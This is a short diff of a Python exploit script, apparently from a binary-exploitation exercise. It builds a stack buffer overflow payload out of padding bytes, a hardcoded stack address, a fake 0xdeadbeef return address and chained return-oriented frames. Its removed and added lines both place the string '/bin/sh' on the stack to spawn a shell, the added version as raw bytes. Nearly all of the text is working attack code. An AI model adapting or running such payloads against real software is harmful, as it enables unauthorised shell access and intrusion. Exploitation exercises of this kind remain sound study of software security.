@@ -3,16 +3,16 @@
 import sys
 
 oflow = b'A' * 134
-string = b"/bin/sh\0"
+string = b"smooth criminal\0"
 fakeret = b'\xef\xbe\xad\xde'
 
-stack_base=0xffffd76c
+stack_base=0xffffd810
 
-string_addr = stack_base + 0x2c
+string_addr = stack_base + 0x24
 frames = [
         [ b'\xab\x88\x04\x08', b'\xf1\x88\x04\x08', b'\x02\x00\x00\x00', string_addr.to_bytes(4, byteorder='little') ],
-        [ b'\xf0\xef\x04\x08', b'\xf1\x88\x04\x08', b'\x68\x73\x2f\x6e', b'\x69\x62\x2f\x00' ],
-        [ b'\xe3\xd0\x06\x08', fakeret, b'\x00\x00\x00\x00' ]
+        [ b'\xf0\xef\x04\x08', b'\xf2\x88\x04\x08', b'\x2f\x62\x69\x6e', b'\x2f\x2f\x73\x68' ],
+        [ fakeret, b'\x00\x00\x00\x00' ]
         ]
 
 exploit = bytearray(oflow)
